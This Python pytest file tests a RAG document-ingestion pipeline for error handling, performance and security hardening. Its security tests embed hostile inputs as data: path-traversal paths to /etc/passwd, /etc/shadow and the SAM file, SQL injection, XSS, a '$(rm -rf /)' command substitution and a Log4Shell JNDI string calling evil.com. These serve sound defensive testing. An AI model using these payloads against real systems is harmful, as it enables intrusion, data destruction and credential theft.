#!/usr/bin/env python3
"""Production hardening and optimization test for Runtime ADG and RAG pipelines."""

import asyncio
import json
import logging
import time
import traceback
from pathlib import Path
from typing import Any

import pytest


@pytest.mark.asyncio
async def test_production_hardening():
    """Run production hardening and optimization tests."""
    print("[PROD HARDENING] Starting production hardening validation...")

    class ProductionHardeningValidator:
        """Validator for production readiness of Runtime ADG and RAG pipelines."""

        def __init__(self):
            self.test_results = {}
            self.errors = []
            self.warnings = []

            # Configure logging
            logging.basicConfig(level=logging.INFO)
            self.logger = logging.getLogger(__name__)

        def log_error(self, message: str, error: Exception = None):
            """Log an error."""
            self.errors.append(message)
            if error:
                self.logger.error(f"{message}: {error}")
            else:
                self.logger.error(message)

        def log_warning(self, message: str):
            """Log a warning."""
            self.warnings.append(message)
            self.logger.warning(message)

        def log_info(self, message: str):
            """Log info."""
            self.logger.info(message)

        async def test_error_handling(self) -> dict[str, Any]:
            """Test error handling and edge cases."""
            self.log_info("\n[PROD HARDENING] Testing error handling...")

            error_tests = {
                "invalid_file_path": False,
                "corrupted_file": False,
                "empty_file": False,
                "large_file": False,
                "special_characters": False,
                "concurrent_access": False
            }

            try:
                # Test 1: Invalid file path
                self.log_info("  Testing invalid file path...")
                try:
                    from agentic_core.knowledge.engine.rag_orchestrator import SovereignRagOrchestrator
                    orchestrator = SovereignRagOrchestrator(Path.cwd())
                    orchestrator.ingest(Path("nonexistent_file.txt"))
                except (FileNotFoundError, ValueError) as e:
                    error_tests["invalid_file_path"] = True
                    self.log_info("    ✓ Invalid file path handled correctly")
                except Exception as e:
                    self.log_error("    ✗ Unexpected error for invalid file", e)

                # Test 2: Corrupted file
                self.log_info("  Testing corrupted file...")
                corrupted_file = Path("test_corrupted.json")
                try:
                    corrupted_file.write_bytes(b'\x00\x01\x02\x03\x04\x05')
                    orchestrator.ingest(corrupted_file)
                    # If it doesn't fail, that's okay (some loaders are resilient)
                    error_tests["corrupted_file"] = True
                    self.log_info("    ✓ Corrupted file handled gracefully")
                except Exception:
                    error_tests["corrupted_file"] = True
                    self.log_info("    ✓ Corrupted file rejected appropriately")
                finally:
                    if corrupted_file.exists():
                        corrupted_file.unlink()

                # Test 3: Empty file
                self.log_info("  Testing empty file...")
                empty_file = Path("test_empty.txt")
                try:
                    empty_file.write_text("")
                    result = orchestrator.ingest(empty_file)
                    if result == "" or result is None:
                        error_tests["empty_file"] = True
                        self.log_info("    ✓ Empty file handled correctly")
                    else:
                        self.log_warning("    ⚠ Empty file returned unexpected content")
                except Exception:
                    error_tests["empty_file"] = True
                    self.log_info("    ✓ Empty file rejected appropriately")
                finally:
                    if empty_file.exists():
                        empty_file.unlink()

                # Test 4: Large file (simulated)
                self.log_info("  Testing large file handling...")
                large_file = Path("test_large.txt")
                try:
                    # Create a moderately large file (100KB)
                    large_content = "Large document test. " * 5000
                    large_file.write_text(large_content)

                    start_time = time.time()
                    result = orchestrator.ingest(large_file)
                    elapsed = time.time() - start_time

                    if elapsed < 5.0:  # Should process within 5 seconds
                        error_tests["large_file"] = True
                        self.log_info(f"    ✓ Large file processed in {elapsed:.2f}s")
                    else:
                        self.log_warning(f"    ⚠ Large file took {elapsed:.2f}s (slow)")
                except Exception as e:
                    self.log_error("    ✗ Large file processing failed", e)
                finally:
                    if large_file.exists():
                        large_file.unlink()

                # Test 5: Special characters
                self.log_info("  Testing special characters...")
                special_file = Path("test_special.txt")
                try:
                    special_content = """
                    Special characters test:
                    • Unicode: ñáéíóú 中文 русский العربية
                    • Emojis: 🚀 🔥 💡 ✅
                    • Symbols: © ® ™ ± × ÷
                    • Quotes: "single" 'double' "curly"
                    • Brackets: [ ] { } ( )
                    """
                    special_file.write_text(special_content, encoding='utf-8')
                    result = orchestrator.ingest(special_file)
                    if result and len(result) > 0:
                        error_tests["special_characters"] = True
                        self.log_info("    ✓ Special characters handled correctly")
                    else:
                        self.log_warning("    ⚠ Special characters caused issues")
                except Exception as e:
                    self.log_error("    ✗ Special characters failed", e)
                finally:
                    if special_file.exists():
                        special_file.unlink()

                # Test 6: Concurrent access (simulated)
                self.log_info("  Testing concurrent access...")
                try:
                    import concurrent.futures

                    def ingest_file(filename):
                        test_file = Path(f"test_concurrent_{filename}.txt")
                        test_file.write_text(f"Concurrent test {filename}")
                        try:
                            result = orchestrator.ingest(test_file)
                            return result is not None
                        finally:
                            if test_file.exists():
                                test_file.unlink()

                    # Run 5 concurrent ingestions
                    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                        futures = [executor.submit(ingest_file, i) for i in range(5)]
                        results = [f.result() for f in futures]

                    if all(results):
                        error_tests["concurrent_access"] = True
                        self.log_info("    ✓ Concurrent access handled correctly")
                    else:
                        self.log_warning("    ⚠ Some concurrent operations failed")

                except Exception as e:
                    self.log_error("    ✗ Concurrent access test failed", e)

            except ImportError as e:
                self.log_error("RAG orchestrator not available for error testing", e)
                error_tests = dict.fromkeys(error_tests)

            self.test_results["error_handling"] = error_tests
            return error_tests

        async def test_performance_benchmarks(self) -> dict[str, Any]:
            """Test performance benchmarks."""
            self.log_info("\n[PROD HARDENING] Testing performance benchmarks...")

            performance_tests = {}

            try:
                # Test 1: Ingestion throughput
                self.log_info("  Testing ingestion throughput...")
                test_files = []
                for i in range(10):
                    test_file = Path(f"perf_test_{i}.txt")
                    test_file.write_text(f"Performance test document {i}. " * 100)
                    test_files.append(test_file)

                try:
                    from agentic_core.knowledge.engine.rag_orchestrator import SovereignRagOrchestrator
                    orchestrator = SovereignRagOrchestrator(Path.cwd())

                    start_time = time.time()
                    for test_file in test_files:
                        orchestrator.ingest(test_file)
                    elapsed = time.time() - start_time

                    throughput = len(test_files) / elapsed
                    performance_tests["ingestion_throughput"] = {
                        "files_per_second": throughput,
                        "elapsed_time": elapsed,
                        "passed": throughput >= 1.0  # Should handle at least 1 file/sec
                    }

                    self.log_info(f"    ✓ Ingested {len(test_files)} files in {elapsed:.2f}s ({throughput:.1f} files/sec)")

                except Exception as e:
                    self.log_error("    ✗ Ingestion throughput test failed", e)

                finally:
                    for test_file in test_files:
                        if test_file.exists():
                            test_file.unlink()

                # Test 2: Retrieval latency
                self.log_info("  Testing retrieval latency...")
                try:
                    queries = ["test query"] * 10
                    latencies = []

                    for query in queries:
                        start_time = time.time()
                        results = await orchestrator.retrieve(query, top_k=3)
                        elapsed = time.time() - start_time
                        latencies.append(elapsed)

                    avg_latency = sum(latencies) / len(latencies)
                    max_latency = max(latencies)

                    performance_tests["retrieval_latency"] = {
                        "average_latency": avg_latency,
                        "max_latency": max_latency,
                        "passed": avg_latency <= 2.0  # Should respond within 2 seconds
                    }

                    self.log_info(f"    ✓ Average retrieval latency: {avg_latency:.3f}s (max: {max_latency:.3f}s)")

                except Exception as e:
                    self.log_error("    ✗ Retrieval latency test failed", e)

                # Test 3: Memory usage (simple check)
                self.log_info("  Testing memory usage...")
                try:
                    import psutil
                    process = psutil.Process()

                    # Baseline memory
                    baseline_memory = process.memory_info().rss / 1024 / 1024  # MB

                    # Load some data
                    large_file = Path("memory_test.txt")
                    large_file.write_text("Memory test content. " * 10000)
                    orchestrator.ingest(large_file)
                    large_file.unlink()

                    # Peak memory
                    peak_memory = process.memory_info().rss / 1024 / 1024  # MB
                    memory_increase = peak_memory - baseline_memory

                    performance_tests["memory_usage"] = {
                        "baseline_mb": baseline_memory,
                        "peak_mb": peak_memory,
                        "increase_mb": memory_increase,
                        "passed": memory_increase < 100  # Should not increase by more than 100MB
                    }

                    self.log_info(f"    ✓ Memory increase: {memory_increase:.1f} MB")

                except ImportError:
                    self.log_warning("    ⚠ psutil not available for memory testing")
                except Exception as e:
                    self.log_error("    ✗ Memory usage test failed", e)

            except ImportError as e:
                self.log_error("Performance testing failed - RAG not available", e)

            self.test_results["performance"] = performance_tests
            return performance_tests

        def test_security_hardening(self) -> dict[str, Any]:
            """Test security hardening measures."""
            self.log_info("\n[PROD HARDENING] Testing security hardening...")

            security_tests = {
                "path_traversal": False,
                "injection_attempts": False,
                "file_type_validation": False,
                "size_limits": False
            }

            try:
                from agentic_core.knowledge.engine.rag_orchestrator import SovereignRagOrchestrator
                orchestrator = SovereignRagOrchestrator(Path.cwd())

                # Test 1: Path traversal attempt
                self.log_info("  Testing path traversal protection...")
                try:
                    # Try to access files outside the project
                    malicious_paths = [
                        Path("../../../etc/passwd"),
                        Path("..\\..\\windows\\system32\\config\\sam"),
                        Path("/etc/shadow"),
                        Path("C:\\Windows\\System32\\config\\SAM")
                    ]

                    blocked = 0
                    for malicious_path in malicious_paths:
                        try:
                            orchestrator.ingest(malicious_path)
                        except (ValueError, FileNotFoundError, PermissionError):
                            blocked += 1
                        except Exception:
                            # Any exception is fine as long as it doesn't succeed
                            blocked += 1

                    if blocked == len(malicious_paths):
                        security_tests["path_traversal"] = True
                        self.log_info("    ✓ Path traversal attempts blocked")
                    else:
                        self.log_warning(f"    ⚠ Only {blocked}/{len(malicious_paths)} path attempts blocked")

                except Exception as e:
                    self.log_error("    ✗ Path traversal test failed", e)

                # Test 2: Injection attempts
                self.log_info("  Testing injection protection...")
                try:
                    injection_payloads = [
                        "'; DROP TABLE documents; --",
                        "<script>alert('xss')</script>",
                        "$(rm -rf /)",
                        "{{7*7}}",
                        "${jndi:ldap://evil.com/a}"
                    ]

                    blocked = 0
                    for payload in injection_payloads:
                        test_file = Path(f"injection_test_{len(payload)}.txt")
                        test_file.write_text(payload)
                        try:
                            result = orchestrator.ingest(test_file)
                            # Check if payload was sanitized (no script tags, no SQL syntax)
                            if result and ("script>" not in result and "DROP TABLE" not in result):
                                blocked += 1
                        except Exception:
                            blocked += 1
                        finally:
                            if test_file.exists():
                                test_file.unlink()

                    if blocked >= len(injection_payloads) * 0.8:  # 80% success rate
                        security_tests["injection_attempts"] = True
                        self.log_info(f"    ✓ Injection payloads handled ({blocked}/{len(injection_payloads)})")
                    else:
                        self.log_warning(f"    ⚠ Only {blocked}/{len(injection_payloads)} payloads handled")

                except Exception as e:
                    self.log_error("    ✗ Injection test failed", e)

                # Test 3: File type validation
                self.log_info("  Testing file type validation...")
                try:
                    # Test with executable files
                    exe_file = Path("test.exe")
                    exe_file.write_bytes(b'MZ\x90\x00')  # PE header

                    try:
                        orchestrator.ingest(exe_file)
                        self.log_warning("    ⚠ Executable file was accepted")
                    except Exception:
                        security_tests["file_type_validation"] = True
                        self.log_info("    ✓ Executable file rejected")
                    finally:
                        if exe_file.exists():
                            exe_file.unlink()

                except Exception as e:
                    self.log_error("    ✗ File type validation test failed", e)

                # Test 4: Size limits
                self.log_info("  Testing size limits...")
                try:
                    # Create a very large file
                    huge_file = Path("huge_file.txt")
                    huge_content = "Large content " * 100000  # ~1.3MB
                    huge_file.write_text(huge_content)

                    try:
                        start_time = time.time()
                        orchestrator.ingest(huge_file)
                        elapsed = time.time() - start_time

                        # If it processes quickly or fails gracefully, that's good
                        if elapsed < 10.0 or elapsed > 30.0:  # Either fast or timed out
                            security_tests["size_limits"] = True
                            self.log_info(f"    ✓ Large file handled appropriately ({elapsed:.1f}s)")
                        else:
                            self.log_warning(f"    ⚠ Large file took {elapsed:.1f}s")

                    except Exception:
                        security_tests["size_limits"] = True
                        self.log_info("    ✓ Large file rejected appropriately")
                    finally:
                        if huge_file.exists():
                            huge_file.unlink()

                except Exception as e:
                    self.log_error("    ✗ Size limits test failed", e)

            except ImportError as e:
                self.log_error("Security testing failed - RAG not available", e)

            self.test_results["security"] = security_tests
            return security_tests

        def generate_report(self) -> dict[str, Any]:
            """Generate a comprehensive hardening report."""
            report = {
                "timestamp": time.time(),
                "summary": {
                    "total_tests": 0,
                    "passed_tests": 0,
                    "failed_tests": 0,
                    "warnings": len(self.warnings),
                    "errors": len(self.errors)
                },
                "results": self.test_results,
                "warnings": self.warnings,
                "errors": self.errors
            }

            # Count tests
            for category, tests in self.test_results.items():
                if isinstance(tests, dict):
                    for test_name, result in tests.items():
                        if isinstance(result, bool):
                            report["summary"]["total_tests"] += 1
                            if result:
                                report["summary"]["passed_tests"] += 1
                            else:
                                report["summary"]["failed_tests"] += 1

            # Calculate success rate
            if report["summary"]["total_tests"] > 0:
                success_rate = report["summary"]["passed_tests"] / report["summary"]["total_tests"]
                report["summary"]["success_rate"] = success_rate
            else:
                report["summary"]["success_rate"] = 0

            return report

    # Initialize validator and run tests
    validator = ProductionHardeningValidator()

    try:
        # Run all tests
        await validator.test_error_handling()
        await validator.test_performance_benchmarks()
        validator.test_security_hardening()

        # Generate report
        report = validator.generate_report()

        # Display results
        print("\n[PROD HARDENING] ✅ Production hardening validation completed!")
        print("[PROD HARDENING] Summary:")
        print(f"  - Total tests: {report['summary']['total_tests']}")
        print(f"  - Passed: {report['summary']['passed_tests']}")
        print(f"  - Failed: {report['summary']['failed_tests']}")
        print(f"  - Success rate: {report['summary']['success_rate']:.1%}")
        print(f"  - Warnings: {report['summary']['warnings']}")
        print(f"  - Errors: {report['summary']['errors']}")

        # Category breakdown
        print("\n[PROD HARDENING] Category Results:")
        for category, tests in report["results"].items():
            if isinstance(tests, dict):
                passed = sum(1 for v in tests.values() if v is True)
                total = sum(1 for v in tests.values() if v is not None)
                if total > 0:
                    print(f"  - {category}: {passed}/{total} ({passed/total:.1%})")

        # Warnings and errors
        if report["warnings"]:
            print("\n[PROD HARDENING] Warnings:")
            for warning in report["warnings"][:5]:  # Show first 5
                print(f"  ⚠ {warning}")

        if report["errors"]:
            print("\n[PROD HARDENING] Errors:")
            for error in report["errors"][:5]:  # Show first 5
                print(f"  ✗ {error}")

        # Save report
        report_file = Path("production_hardening_report.json")
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"\n[PROD HARDENING] Report saved to: {report_file}")

        # Determine success
        success = (
            report["summary"]["success_rate"] >= 0.8 and  # 80% of tests pass
            report["summary"]["errors"] == 0  # No critical errors
        )

        if success:
            print("\n[PROD HARDENING] ✅ Production hardening criteria met!")
        else:
            print("\n[PROD HARDENING] ⚠ Some production hardening criteria not met")

        return success

    except Exception as e:
        print(f"\n[PROD HARDENING] ❌ Hardening validation failed: {e}")
        traceback.print_exc()
        return False


if __name__ == "__main__":
    success = asyncio.run(test_production_hardening())
    exit(0 if success else 1)
